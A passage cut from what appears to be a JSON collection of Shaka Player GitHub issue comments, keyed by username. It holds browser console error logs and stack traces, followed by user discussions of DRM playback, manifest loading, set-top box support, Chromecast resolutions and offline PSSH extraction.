ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n16:06:10.893 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://truman-nightly.sandbox.google.com/segments/redirect/c/1.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2. (Reason: CORS request did not succeed).\n16:06:10.893 Failed to load \u2018https://truman-nightly.sandbox.google.com/segments/redirect/c/1.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2\u2019. A ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n16:06:11.502 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://truman-nightly.sandbox.google.com/segments/redirect/c/1.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2. (Reason: CORS request did not succeed).\n16:06:11.502 Failed to load \u2018https://truman-nightly.sandbox.google.com/segments/redirect/c/1.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2\u2019. A ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n16:06:11.647 Player error \nObject { severity: 2, category: 1, code: 1002, data: (3) [\u2026], handled: false, message: \"Shaka Error NETWORK.HTTP_ERROR (https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2,TypeError: NetworkError when attempting to fetch resource.,1)\", stack: \"shaka.util.Error@https://shaka-player-demo.appspot.com/lib/util/error.js:89:13\\nshaka.net.HttpFetchPlugin/promise<@https://shaka-player-demo.appspot.com/lib/net/http_fetch_plugin.js:100:29\\npromise callbackshaka.net.HttpFetchPlugin@https://shaka-player-demo.appspot.com/lib/net/http_fetch_plugin.js:69:17\\nshaka.net.NetworkingEngine.prototype.send_/sendOperation<@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:473:21\\nwrapChainCallback_@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:234:17\\nchain/<@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:195:15\\npromise callbackchain@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:175:5\\nshaka.net.NetworkingEngine.prototype.send_@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:467:23\\nshaka.net.NetworkingEngine.prototype.send_/sendOperation<@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:507:14\\nwrapChainCallback_@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:234:17\\nchain/<@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:208:15\\npromise callbackchain@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:175:5\\nshaka.net.NetworkingEngine.prototype.send_@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:467:23\\nshaka.net.NetworkingEngine.prototype.makeRequestWithRetry_@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:416:10\\nshaka.net.NetworkingEngine.prototype.request/requestOperation<@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:329:13\\nwrapChainCallback_@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:234:17\\nchain/<@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:195:15\\npromise callbackchain@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:175:5\\nshaka.net.NetworkingEngine.prototype.request@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:328:26\\nshaka.media.StreamingEngine.prototype.fetch_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:2151:12\\nshaka.media.StreamingEngine.prototype.initSourceBuffer_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1704:19\\nshaka.media.StreamingEngine.prototype.fetchAndAppend_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1494:26\\nshaka.media.StreamingEngine.prototype.update_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1246:3\\nshaka.media.StreamingEngine.prototype.onUpdate_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1102:17\\nsetTimeout handlershaka.media.StreamingEngine.prototype.scheduleUpdate_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:2208:28\\nshaka.media.StreamingEngine.prototype.initStreams_/<@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:884:9\\npromise callbackshaka.media.StreamingEngine.prototype.initStreams_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:864:10\\nshaka.media.StreamingEngine.prototype.init@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:418:10\\nshaka.Player.prototype.load@https://shaka-player-demo.appspot.com/lib/player.js:779:11\\nAsyncshakaDemo.load/<@https://shaka-player-demo.appspot.com/demo/asset_section.js:313:12\\npromise callbackshakaDemo.load@https://shaka-player-demo.appspot.com/demo/asset_section.js:311:3\\nEventListener.handleEventshakaDemo.setupAssets_@https://shaka-player-demo.appspot.com/demo/asset_section.js:111:3\\nshakaDemo.init/<@https://shaka-player-demo.appspot.com/demo/main.js:203:24\\npromise callbackshakaDemo.init@https://shaka-player-demo.appspot.com/demo/main.js:185:5\\nEventListener.handleEvent@https://shaka-player-demo.appspot.com/demo/main.js:742:5\\n\" }\nmain.js:687:3\nshakaDemo.onError_\nhttps://shaka-player-demo.appspot.com/demo/main.js:687:3\nshakaDemo.onErrorEvent_\nhttps://shaka-player-demo.appspot.com/demo/main.js:678:3\nshaka.util.FakeEventTarget.prototype.dispatchEvent\nhttps://shaka-player-demo.appspot.com/lib/util/fake_event_target.js:117:9\nshaka.cast.CastProxy.prototype.playerProxyLocalEvent_\nhttps://shaka-player-demo.appspot.com/lib/cast/cast_proxy.js:579:3\nshaka.util.FakeEventTarget.prototype.dispatchEvent\nhttps://shaka-player-demo.appspot.com/lib/util/fake_event_target.js:117:9\nshaka.Player.prototype.onError_\nhttps://shaka-player-demo.appspot.com/lib/player.js:3066:3\nshaka.media.StreamingEngine.prototype.handleStreamingError_/<\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:2244:5\nshaka.media.StreamingEngine.prototype.handleStreamingError_\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:2238:3\nshaka.media.StreamingEngine.prototype.fetchAndAppend_/<\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1558:7\nshaka.media.StreamingEngine.prototype.fetchAndAppend_\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1506:3\nshaka.media.StreamingEngine.prototype.update_\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1246:3\nshaka.media.StreamingEngine.prototype.onUpdate_\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1102:17\nshaka.media.StreamingEngine.prototype.scheduleUpdate_\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:2208:28\nshaka.media.StreamingEngine.prototype.initStreams_/<\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:884:9\n(Async: promise callback) shaka.media.StreamingEngine.prototype.initStreams_\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:864:10\nshaka.media.StreamingEngine.prototype.init\nhttps://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:418:10\nshaka.Player.prototype.load\nhttps://shaka-player-demo.appspot.com/lib/player.js:779:11\nshakaDemo.load/<\nhttps://shaka-player-demo.appspot.com/demo/asset_section.js:313:12\n(Async: promise callback) shakaDemo.load\nhttps://shaka-player-demo.appspot.com/demo/asset_section.js:311:3\n(Async: EventListener.handleEvent) shakaDemo.setupAssets_\nhttps://shaka-player-demo.appspot.com/demo/asset_section.js:111:3\nshakaDemo.init/<\nhttps://shaka-player-demo.appspot.com/demo/main.js:203:24\n(Async: promise callback) shakaDemo.init\nhttps://shaka-player-demo.appspot.com/demo/main.js:185:5\n(Async: EventListener.handleEvent) \nhttps://shaka-player-demo.appspot.com/demo/main.js:742:5\n16:06:12.146 Player error \nObject { severity: 2, category: 1, code: 1002, data: (3) [\u2026], handled: false, message: \"Shaka Error NETWORK.HTTP_ERROR (https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2,TypeError: NetworkError when attempting to fetch resource.,1)\", stack: \"shaka.util.Error@https://shaka-player-demo.appspot.com/lib/util/error.js:89:13\\nshaka.net.HttpFetchPlugin/promise<@https://shaka-player-demo.appspot.com/lib/net/http_fetch_plugin.js:100:29\\npromise callbackshaka.net.HttpFetchPlugin@https://shaka-player-demo.appspot.com/lib/net/http_fetch_plugin.js:69:17\\nshaka.net.NetworkingEngine.prototype.send_/sendOperation<@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:473:21\\nwrapChainCallback_@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:234:17\\nchain/<@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:195:15\\npromise callbackchain@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:175:5\\nshaka.net.NetworkingEngine.prototype.send_@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:467:23\\nshaka.net.NetworkingEngine.prototype.send_/sendOperation<@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:507:14\\nwrapChainCallback_@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:234:17\\nchain/<@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:208:15\\npromise callbackchain@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:175:5\\nshaka.net.NetworkingEngine.prototype.send_@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:467:23\\nshaka.net.NetworkingEngine.prototype.makeRequestWithRetry_@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:416:10\\nshaka.net.NetworkingEngine.prototype.request/requestOperation<@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:329:13\\nwrapChainCallback_@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:234:17\\nchain/<@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:195:15\\npromise callbackchain@https://shaka-player-demo.appspot.com/lib/util/abortable_operation.js:175:5\\nshaka.net.NetworkingEngine.prototype.request@https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:328:26\\nshaka.media.StreamingEngine.prototype.fetch_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:2151:12\\nshaka.media.StreamingEngine.prototype.initSourceBuffer_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1704:19\\nshaka.media.StreamingEngine.prototype.fetchAndAppend_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1494:26\\nshaka.media.StreamingEngine.prototype.update_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1246:3\\nshaka.media.StreamingEngine.prototype.onUpdate_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1102:17\\nsetTimeout handlershaka.media.StreamingEngine.prototype.scheduleUpdate_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:2208:28\\nshaka.media.StreamingEngine.prototype.initStreams_/<@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:884:9\\npromise callbackshaka.media.StreamingEngine.prototype.initStreams_@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:864:10\\nshaka.media.StreamingEngine.prototype.init@https://shaka-player-demo.appspot.com/lib/media/streaming_engine.js:418:10\\nshaka.Player.prototype.load@https://shaka-player-demo.appspot.com/lib/player.js:779:11\\nAsyncshakaDemo.load/<@https://shaka-player-demo.appspot.com/demo/asset_section.js:313:12\\npromise callbackshakaDemo.load@https://shaka-player-demo.appspot.com/demo/asset_section.js:311:3\\nEventListener.handleEventshakaDemo.setupAssets_@https://shaka-player-demo.appspot.com/demo/asset_section.js:111:3\\nshakaDemo.init/<@https://shaka-player-demo.appspot.com/demo/main.js:203:24\\npromise callbackshakaDemo.init@https://shaka-player-demo.appspot.com/demo/main.js:185:5\\nEventListener.handleEvent@https://shaka-player-demo.appspot.com/demo/main.js:742:5\\n\" }\nmain.js:687:3\n`. ",
    "bansalvks": "First of all I am a fan of Shaka\nI love Shaka player but unfortunately, my team has to choose VideoJs just because you are currently not supporting Fairplay and we cannot loose our safari users. \nIs there a workaround/Plugin that we can use with shaka to play DRM on safari?\nCan you confirm a date, when the #382 will be ready?\nMany thanks for building such a great player.\nYour Admirer,\nVikas Bansal. Many thanks for the response @mimse @ismena @vaage \nIf I understood you correctly @mimse then I need to detect browser and if it safari then use a simple video tag and set it's src= and the fair-play stream will be played?\nI will need to use 2 players... shaka for rest of the world and native video tag for safari.... @mimse I am not able use the link as it is showing unauthorised access. I am currently struggling to play DRM fairplay in native Video tag.\nIs it possible for you to provide any help.., as it has been more than 2 weeks since I am struggling with it.. Yes @vaage \nMany thanks for your kind answer @chrisfillmore I am grateful to you.\nThank you for your guidance and support.. @ismena thank you for replying, it means a lot.\nI updated the codepen : https://codepen.io/bansalvks-the-decoder/pen/xyYgEp?editors=0010\nand added the config that you mentioned\nplayer.configure('manifest.defaultPresentationDelay', 0);\nHowever it does not work. :( still stuck with both issues.. This is a Disheartening News for me @TheModMaker\nMay I know the release cycle span. So that I may guess how soon will we get the release v2.7. ",
    "pix-dgee": "return fetch(\n            'https://host.com/stream.mpd',\n            { headers }\n        )\n            .then(response => response.blob())\n            .then( blob => {\n                return window.URL.createObjectURL(blob);\n            })\nconsumer:\ngetManifestBlob()\n                .then(streamUrl => {\n                    this.load(streamUrl); //wraps shaka.Player.load\n                }). I inlined much of this to isolate the issue. I'm still seeing the error with the following sample code:\nfetch(\n  this.stream, // eg. 'https://host.com/stream.mpd'\n  { headers }\n)\n.then(response => response.blob())\n.then( blob => {\n  const url = window.URL.createObjectURL(blob);\n  this.load(url); // wraps.shaka.Player.load\n});. Thanks so much for being so responsive, @joeyparrish! I had tried using the HttpFetchPlugin but didn't think about how it wouldn't be identifiable as a DASH manifest. Passing in the DashParser resolved the issue.\nI now have this working - our manifests do in fact use relative urls, but until I can co-ordinate a backend change, I'm just manually transforming it in the client before I save it to the Blob. \nRegarding your recommended enhancement, that all sounds great. I would say that what we're doing is hardly common practice, so I don't think it's critical functionality, but would definitely be nice to have.. Thank you, that sounds like exactly what we're trying to accomplish!. Updating this with some additional info. Using HttpFetchPlugin in conjunction with shaka.dash.DashParser works like a charm in recent versions of Chrome. \nUnfortunately, as we're relying on Castlabs' prepackaged electron releases ( https://github.com/castlabs/electron-releases ) to enable Widevine support in Electron, we discovered that this surfaces the same 1000 error attached above when using Chrome 59.. Absolutely. Was just commenting in case some lost soul wanders into this thread in the future, I don't expect any action to be taken ;) Sorry if that was unclear.. Would a sample manifest be helpful in this case? I could provide that, unfortunately manifest/license servers are authenticated so I'd need to wrangle credentials for someone on the shaka team, and our dev environments require VPN.. ",
    "etiennetalbot": "@joeyparrish any luck getting a response from Google? This still doesn't work for me unfortunately. ",
    "citizenofearth": "This issue is still occurring with the same vimeo manifest in the original post above.\nShaka Error MEDIA.VIDEO_ERROR (3,,CHUNK_DEMUXER_ERROR_APPEND_FAILED: video frame with PTS 1000us has negative DTS -65667us after applying timestampOffset, handling any discontinuity, and filtering against append window). https://shaka-player-demo.appspot.com/demo/#asset=https://player.vimeo.com/external/262578199.m3u8?s=42a2b5a5ef2a4783103b5121e56832a4f8d029ac&oauth2_token_id=1086537197;lang=en-GB;build=uncompiled. ",
    "kiranbsravi": "My chrome version is 67.0.3396.99. But the video should start to play after i hit on play button explicitly right. It doesn't play even if i give explicit play. . As of now we are running it on my internal machine. It is not exposed to external world. So unable to share any manifest uris. I am configuring my player as follows :\njs\nplayer.configure({\n                  streaming: {\n                    bufferingGoal: 5,\n                            jumpLargeGaps : true\n                  },\n                  abr: {\n                      enabled: false\n                  }\n   });\nAfter i set jumpLargeGaps to true it is showing following console messages, for almost all the segments :\n\"Jumping forward 5.0049999999999955 seconds because of gap starting at 846.826 and ending at 851.798\"\nMeaning it is jumping almost all the segments. So, my video doesnt move continuously. It jumps frame after frame. I guess this is becuase the shaka player detects large gaps in almost all segments. While, on Firefox it is able to play the same segments continuously. . ",
    "jkringen": "Hey @chrisfillmore, this is a commerical \"Smart TV\" type of set top box made by a company called Enseo actually. We also are integrated into WebOS commercial STB and are having similar playback issues there as well actually.\nHowever, for this specific issue, this was tested on the Enseo STB. I will loop back and find out the exact browser details here and post them back into this thread! I do know it's a WebKit based browser, but I'll find the details here shortly and get back to you on that.\nAbout the 403 Forbidden message, give it a shot again. AWS was having some admin UI issues when I was uploading these files, and I think the permission changes didn't take effect. Should be good now.. Hi @joeyparrish! It does support PlayReady, that is actually the current streaming protocol we are using on these platforms, but using their plain video tag implementation, which has a proprietary playback system embedded into their browser to support DRM, etc. This is currently working, but we are wanting to move away from the native playback mechanism to a 3rd party player like Shaka to provide a more consistent experience, better adaptation logic, etc.\nThe company claims that the browser fully supports EME and MSE, so I'm hoping this is a simple configuration issue of some sort that I am missing.\nAs I stated above to @chrisfillmore, I'm currently gathering the browser information and will post the details here shortly. :). @chrisfillmore, yeah I am definitely feeling the pain right now both of these platforms (Web OS & Enseo). I originally did the work to implement DRM playback on both of these platforms using the regular video tag method, which also requires the client to perform platform-specific proprietary logic to initialize their DRM system and then pass it the proper bits of data, etc.\nI do have the Shaka player working very nicely on both platforms for non-DRM'd content, but as soon as DRM is in the mix it fails right away. \nBoth companies are telling us that 3rd party JavaScript players should work, but we are not having much luck so far, obviously. =P I'm also talking with LG and Enseo both right now to try and get help from their side as well.\nLG/WebOS is actually getting further. It is reading the manifest, seeing the different streams/variants, etc. The video player even appears to start progressing for a moment, but no video is ever displayed.. Here is what the browser user agent is being reported as at least: Mozilla/5.0(Linux;Linuxmips;Enseo/HD3300)AppleWebKit/537.36(KHTML,\nlikeGecko)Safari/537.36v2.4.2\nHere is the output of the Shaka support page as displayed on the Enseo STB:\njson\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp4; codecs=\\\"hev1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hev1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"vp9\\\"\": false,\n    \"video/mp4; codecs=\\\"vp09.00.10.08\\\"\": false,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"opus\\\"\": false,\n    \"audio/mp4; codecs=\\\"flac\\\"\": false,\n    \"video/webm; codecs=\\\"vp8\\\"\": false,\n    \"video/webm\": false,\n    \"video/webm; codecs=\\\"vp9\\\"\": false,\n    \"video/webm; codecs=\\\"vp09.00.10.08\\\"\": false,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": false,\n    \"audio/webm\": false,\n    \"audio/webm; codecs=\\\"opus\\\"\": false,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": false,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.widevine.alpha\": null,\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null\n  },\n  \"offline\": true\n}\nI can see why the key system is not found, looks like Shaka doesn't see any DRM systems available on this browser. I will send this to Enseo and see what they say about it. Going to check this on the WebOS platform as well to see what that is showing. I'm assuming, since playback attempts to start on WebOS, that it will have some of the DRM systems available at least.. From Enseo: The browser is Chromium version 39 with MSE and EME for playback support.\nNot much detail, but I'll see what more I can get myself.... ",
    "warking": "I meam the first one: \n\" that when you play on the ChromeCast, the max resolution you can manually select is 720p and when you play in a browser (not casting) the max resolution you can manually select is 1080p \"\nhere is the screenshot:\nhttps://imgur.com/a/0J0IBeU\nwhen casting to chromecast, that 3 1080p options gone.\nthe best quality option in the select element becomes 720p\nAnd I know that this may be a demo player thing rather than a library restriction but I don't find any code of those restriction.\nsorry for the confusion caused by my vague expression. Thank you for your digging up and practice.\nI just checked google cast sdk( https://developers.google.com/cast/docs/media ), it says the max video codec it supports is H.264 Level 4.1 while in another section of the page it states that chromecast ultra could support up to \"HEVC / H.265 Main and Main10 Profiles up to level 5.1 (2160p/60fps)\" \nDo you happen to have an ultra to test if avc1.640032 works fine with the ultra?. Got it.\nThank you.\nIt seems that chromecast has a lot work to do to catch up the modern high level codec stuffs\n. ",
    "tmagnien": "Hi. Sorry, I realize my question was not clear.\nTo sum up, this works:\n<Location>http://somedomain/url?foo=1&amp;bar=2</Location>\nBut this is ignored:\n<Location><![CDATA[http://somedomain/url?foo=1&bar=2]]></Location>\nAnd I wanted to know if this is expected behaviour, as the 2nd form using CDATA is easier for me to generate.\nThanks,\nThierry. ",
    "sasank4git": "Thank you for the information. We will try raising an issue with opera. \nBut the actual concern for us is that \"few users have reported the issue is happening while using google chrome browser too\",while we are unable to reproduce the issue on our end in chrome browser its happening with opera browser.. @TheModMaker  Tried changing bit-rate of the audio to 64kbps and checked but it didn't help. Already raised an issue with Opera team and awaiting for the response , issue-id:ID: \nDNAWIZ-38425\n, . @TheModMaker  @BucherTomas  Thank you. Tried with audio freq 44100 Hz and video running smooth in the opera browser too. . ",
    "bartsidee": "Thank you for the detailed answer. \nUnderstanding the limitations and complications, would it not be possible to create a small utility method as a fallback that would be able to capture the PSSH from the downloading (mp4) segments (without overhauling the logic to much and/or introducing complex parsers).\nThe below might be an interesting reference:\nhttps://github.com/youtube/js_mse_eme/blob/586255b3261dd63b951246b2ef01085f9bc26ef5/js/lib/eme/encryptedMediaPortability.js#L109. Great! We have been working on a solution and have been able to make this work by using the shaka mp4 atom parser on the initial segment to extract the pssh. We will share a PR for review once ready. the function we moved is indeed a utility function to normalise the PSSH data. This was originally written by the shaka team for the MS polyfill, but we also require it for the parsing of the segments so we moved it out.. this method is originally used with the Ms polyfill that fires encrypted events when it sees a pssh box, however Ms apparently does not extract the pssh completely. The MS PSSH data is however already extracted from the Moov box.\nWhen we manually parse the binary segments the PSSH data is still contained within the Moov box so we need to extract it first, this is why we used the optional argument to still be able to support both use cases. \n so we don't need to parse it.. we can update to the latest shaka standards. we can update to the latest shaka standards. The reason this method is requiring and returning a manifest is because we currently inject the PSSH initData directly into the manifest. As this is actioned before the DRMEngine is initialised, it is seamless and minimises the impact of potential other changes of the shaka source to support this use case (being it only applicable to offline DRM content). We could probably have been a bit more elaborate on this and are happy to update the naming conventions + docs. we could break up the method for clarity; downloading the first segments and extracting the init data. this is indeed because for online playback EME is handling the pssh extraction.. > This would probably be best done in shaka.offline.DownloadManager since we are downloading the segments anyway. \nI was not 100% sure if the initial segment was actually downloaded for offline usage, understanding one could potentially hook into the existing download stream we faced the issue that the DRMEngine was initialised before the download manager is started.\nAs we did not directly had a good reference how to inject a PSSH key after the DRM engine was already initialised (the engine failed on not having a pssh value), we found it easier to inject it before the DRM engine was loaded so we condensed the logic into storage.js and injecting the pssh data into the manifest so it would be seamless work with the existing shaka code\nPer above we could break up the method and move part of the logic to the downloadManager, however it might still be easier to download the first segments separately first to prevent larger adjustments to classes like the DrmEngine.\n\nPlus you should check every segment since there can be pssh boxes in following segments for key rotation.\n\nWe are currently not working with content that is using key rotation, would that even work for online content? But are happy to contribute. Can you point us in the right direction how this could conceptually be applied in this setup?. ",
    "ldayananda": "Yes, correct for all three. If Shaka were to update to include the upcoming mux.js change, you would need to apply a similar adjustment to caption start/end times as is currently applied to video and audio. . ",
